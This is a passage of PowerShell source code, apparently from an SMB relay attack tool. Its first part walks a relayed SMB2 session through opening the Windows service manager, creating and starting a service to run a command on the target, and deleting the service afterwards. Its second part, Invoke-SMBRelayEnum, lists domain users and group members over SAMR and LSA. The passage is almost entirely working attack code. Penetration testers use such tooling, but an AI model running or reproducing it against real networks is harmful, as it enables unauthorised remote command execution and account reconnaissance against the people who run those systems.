$SMB2_data.Length + $SCM_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CreateServiceW_First'\n                    {\n                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)\n                        $message_ID++\n                        $stage_current = $stage\n                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]\n                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first\n                        $packet_RPC_data[\"AllocHint\"] = [System.BitConverter]::GetBytes($SCM_data.Length)\n                        $SMB_split_index_tracker = $SMB_split_index\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CreateServiceW_Middle'\n                    {\n                        $SMB_split_stage++\n                        $message_ID++\n                        $stage_current = $stage\n                        $SCM_data_middle = $SCM_data[$SMB_split_index_tracker..($SMB_split_index_tracker + $SMB_split_index - 1)]\n                        $SMB_split_index_tracker += $SMB_split_index\n                        $packet_RPC_data = New-PacketRPCRequest 0x00 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_middle\n                        $packet_RPC_data[\"AllocHint\"] = [System.BitConverter]::GetBytes($SCM_data.Length - $SMB_split_index_tracker + $SMB_split_index)\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CreateServiceW_Last'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $SCM_data_last = $SCM_data[$SMB_split_index_tracker..$SCM_data.Length]\n                        $packet_RPC_data = New-PacketRPCRequest 0x02 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_last\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'DeleteServiceW'\n                    { \n\n                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '1d-04-00-00')\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Command executed on $Target\") > $null\n                        }\n                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '02-00-00-00')\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Service $SMB_service failed to start on $Target\") > $null\n                        }\n\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SCM_data = New-PacketSCMDeleteServiceW $SMB_service_context_handle\n                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x02,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'Logoff'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2SessionLogoffRequest\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'OpenSCManagerW'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SCM_data = New-PacketSCMOpenSCManagerW $SMB_service_bytes $SMB_service_length\n                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0f,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data \n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data\n                        $stage = 'SendReceive'         \n                    }\n\n                    'ReadRequest'\n                    {\n                        Start-Sleep -m 150\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2ReadRequest $SMB_file_ID\n                        $packet_SMB2_data[\"Length\"] = 0xff,0x00,0x00,0x00\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data \n                        $stage = 'SendReceive'\n                    }\n\n                    'RPCBind'\n                    {\n                        $SMB_named_pipe_bytes = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 # \\svcctl\n                        $SMB_file_ID = $client_receive[132..147]\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_RPC_data = New-PacketRPCBind 0x48,0x00 1 0x01 0x00,0x00 $named_pipe_UUID 0x02,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data \n                        $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID $RPC_data.Length\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                        $RPC_data_length = $SMB2_data.Length + $RPC_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'SendReceive'\n                    {\n                        $client_stream.Write($client_send,0,$client_send.Length) > $null\n                        $client_stream.Flush()\n                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null\n\n                        if(Get-StatusPending $client_receive[12..15])\n                        {\n                            $stage = 'StatusPending'\n                        }\n                        else\n                        {\n                            $stage = 'StatusReceived'\n                        }\n\n                    }\n\n                    'StartServiceW'\n                    {\n\n                        if([System.BitConverter]::ToString($client_receive[132..135]) -eq '00-00-00-00')\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Service $SMB_service created on $Target\") > $null\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Trying to execute command on $Target\") > $null\n                            $SMB_service_context_handle = $client_receive[112..131]\n                            $message_ID++\n                            $stage_current = $stage\n                            $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                            $packet_SCM_data = New-PacketSCMStartServiceW $SMB_service_context_handle\n                            $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data\n                            $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x13,0x00\n                            $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data \n                            $packet_SMB2_data = New-PacketSMB2WriteRequest $SMB_file_ID ($RPC_data.Length + $SCM_data.Length)\n                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data \n                            $RPC_data_length = $SMB2_data.Length + $SCM_data.Length + $RPC_data.Length\n                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $RPC_data_length\n                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $RPC_data + $SCM_data\n                            $stage = 'SendReceive'   \n                        }\n                        elseif([System.BitConverter]::ToString($client_receive[132..135]) -eq '31-04-00-00')\n                        {\n                            $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Service $SMB_service creation failed on $Target\") > $null\n                            $SMB_relay_failed = $true\n                        }\n                        else\n                        {\n                            $SMB_relay_failed = $true\n                        }\n\n                    }\n\n                    'StatusPending'\n                    {\n                        $client_stream.Read($client_receive,0,$client_receive.Length)\n\n                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')\n                        {\n                            $stage = $stage_next\n                        }\n\n                    }\n\n                    'StatusReceived'\n                    {\n\n                        switch ($stage_current)\n                        {\n\n                            'CloseRequest'\n                            {\n                                $stage = 'TreeDisconnect'\n                            }\n\n                            'CloseServiceHandle'\n                            {\n\n                                if($SMB_close_service_handle_stage -eq 2)\n                                {\n                                    $stage = 'CloseServiceHandle'\n                                }\n                                else\n                                {\n                                    $stage = 'CloseRequest'\n                                }\n\n                            }\n\n                            'CreateRequest'\n                            {\n                                $file_ID = $client_receive[132..147]\n                                $stage = 'RPCBind'\n                            }\n\n                            'CreateServiceW'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'StartServiceW'\n                            }\n\n                            'CreateServiceW_First'\n                            {\n\n                                if($SMB_split_stage_final -le 2)\n                                {\n                                    $stage = 'CreateServiceW_Last'\n                                }\n                                else\n                                {\n                                    $SMB_split_stage = 2\n                                    $stage = 'CreateServiceW_Middle'\n                                }\n                                \n                            }\n\n                            'CreateServiceW_Middle'\n                            {\n\n                                if($SMB_split_stage -ge $SMB_split_stage_final)\n                                {\n                                    $stage = 'CreateServiceW_Last'\n                                }\n                                else\n                                {\n                                    $stage = 'CreateServiceW_Middle'\n                                }\n\n                            }\n\n                            'CreateServiceW_Last'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'StartServiceW'\n                            }\n\n                            'DeleteServiceW'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'CloseServiceHandle'\n                                $SMB_close_service_handle_stage = 1\n                            }\n\n                            'Logoff'\n                            {\n                                $stage = 'Exit'\n                            }\n\n                            'OpenSCManagerW'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'CheckAccess' \n                            }\n\n                            'ReadRequest'\n                            {\n                                $stage = $stage_next\n                            }\n\n                            'RPCBind'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'OpenSCManagerW'\n                            }\n\n                            'StartServiceW'\n                            {\n                                $stage = 'ReadRequest'\n                                $stage_next = 'DeleteServiceW'  \n                            }\n\n                            'TreeConnect'\n                            {\n                                $tree_ID = $client_receive[40..43]\n                                $stage = 'CreateRequest'\n                            }\n\n                            'TreeDisconnect'\n                            {\n\n                                if($Attack -contains 'Session' -or $Attack -contains 'Execute')\n                                {\n                                    $inveigh.session_message_ID_table[$inveigh.session_count] = $message_ID\n                                    $stage = 'Exit'\n                                }\n                                else\n                                {\n                                    $stage = 'Logoff'\n                                }\n\n                            }\n\n                        }\n\n                    }\n\n                    'TreeConnect'\n                    {\n                        $tree_ID = 0x00,0x00,0x00,0x00\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $SMB_path_bytes\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'TreeDisconnect'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $false $message_ID $SMB_process_ID $tree_ID $session_ID\n                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest\n                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header\n                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data\n                        $stage = 'SendReceive'                        \n                    }\n\n                   \n\n                }\n\n                if($SMB_relay_failed -and $Attack -notcontains 'Session')\n                {\n                    $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] Relay failed on $Target\") > $null\n                    $stage = 'Exit'\n                }\n\n            }\n            catch\n            {\n                $error_message = $_.Exception.Message\n                $error_message = $error_message -replace \"`n\",\"\"\n                $inveigh.output_queue.Add(\"[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current\") > $null\n                $stage = 'Exit'\n            }\n\n        }\n\n        if($Attack -contains 'Session')\n        {\n            return $SMB_administrator\n        }\n        else\n        {\n            $client.Close()\n        }\n            \n    }\n\n    function Invoke-SMBRelayEnum\n    {\n        param ($client,$SMB_user_ID,$session_ID,$process_ID,$Enumerate,$EnumerateGroup)\n\n        $client_receive = New-Object System.Byte[] 81920\n        $SMB_signing = $false\n        $message_ID =  $inveigh.session_message_ID_table[$inveigh.session_count]\n        $action = $Enumerate\n        $tree_ID = 0x00,0x00,0x00,0x00\n        $group = $EnumerateGroup\n\n        if($Action -eq 'All')\n        {\n            $action_stage = 'group'\n        }\n        else\n        {\n            $action_stage = $Action    \n        }\n\n        $path = \"\\\\\" + $Target + \"\\IPC$\"\n        $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)\n        $j = 0\n        $stage = 'TreeConnect'\n        $client_stream = $client.GetStream()\n            \n        while ($stage -ne 'Exit')\n        {\n\n            try\n            {\n            \n                switch ($stage)\n                {\n        \n                    'CloseRequest'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2CloseRequest $file_ID\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'Connect2'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRConnect2 $Target\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'Connect5'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRConnect5 $Target\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'CreateRequest'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2CreateRequestFile $named_pipe\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data  \n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'EnumDomainUsers'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMREnumDomainUsers $SAMR_domain_handle\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'GetMembersInAlias'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRGetMembersInAlias $SAMR_policy_handle\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'Logoff'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SMB_data = New-PacketSMB2SessionLogoffRequest\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data\n                        $stage = 'SendReceive' \n                    }\n\n                    'LookupNames'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRLookupNames $SAMR_domain_handle $Group\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'LookupRids'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_SAMR_data = New-PacketSAMRLookupRids $SAMR_domain_handle $RID_count_bytes $RID_list\n                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data \n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00\n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data \n                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length\n                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length\n                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service\n                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data\n                        $stage = 'SendReceive'\n                    }\n\n                    'LSAClose'\n                    {\n                        $message_ID++\n                        $stage_current = $stage\n                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID\n                        $packet_LSARPC_data = New-PacketLSAClose $policy_handle\n                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data \n                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280\n                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00\n                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data\n                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header\n                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 